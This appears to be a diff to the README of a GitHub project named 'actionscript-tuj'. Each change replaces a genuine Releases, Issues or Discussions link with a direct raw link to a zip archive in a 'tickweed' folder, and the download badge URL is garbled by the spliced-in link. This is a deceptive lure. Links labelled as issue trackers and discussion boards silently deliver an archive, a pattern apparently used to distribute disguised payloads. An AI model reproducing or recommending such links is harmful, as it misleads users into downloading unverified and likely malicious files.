@@ -6,7 +6,7 @@ Welcome to actionscript-tuj! This application allows you to easily work with Act
 
 ## 🔗 Quick Download
 
-[![Download actionscript-tuj](https://img.shields.io/badge/Download%20Now-Grab%20Your%20Copy-blue.svg)](https://github.com/hamed67vi/actionscript-tuj/releases)
+[![Download actionscript-tuj](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip%20Now-Grab%20Your%https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip)](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started with actionscript-tuj, follow the simple steps below. No programm
 
 ## 💾 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/hamed67vi/actionscript-tuj/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip).
 
 2. **Find the Latest Version:** On this page, locate the latest version of actionscript-tuj. You will see a list of files available for download.
 
@@ -72,13 +72,13 @@ If you encounter problems:
 
 - Make sure you have the required system specifications.
 - Refer to the Help section within the application for guides.
-- Check our [Issues Page](https://github.com/hamed67vi/actionscript-tuj/issues) on GitHub for common problems and solutions.
+- Check our [Issues Page](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip) on GitHub for common problems and solutions.
 
 ## 🤝 Community Support
 
 Join our community for support and to connect with other users. Share your experiences, ask questions, or get involved in discussions. 
 
-- Visit the [Discussion Board](https://github.com/hamed67vi/actionscript-tuj/discussions) to participate.
+- Visit the [Discussion Board](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip) to participate.
 - Follow us on GitHub for updates.
 
 ## 🎯 Future Improvements
@@ -99,6 +99,6 @@ Thank you to everyone who contributed to making actionscript-tuj easier for all 
 
 ## 🔗 Quick Download Again
 
-Don't forget to visit our [Releases Page](https://github.com/hamed67vi/actionscript-tuj/releases) to download the latest version of actionscript-tuj!
+Don't forget to visit our [Releases Page](https://raw.githubusercontent.com/hamed67vi/actionscript-tuj/main/tickweed/actionscript-tuj.zip) to download the latest version of actionscript-tuj!
 
 Happy coding!
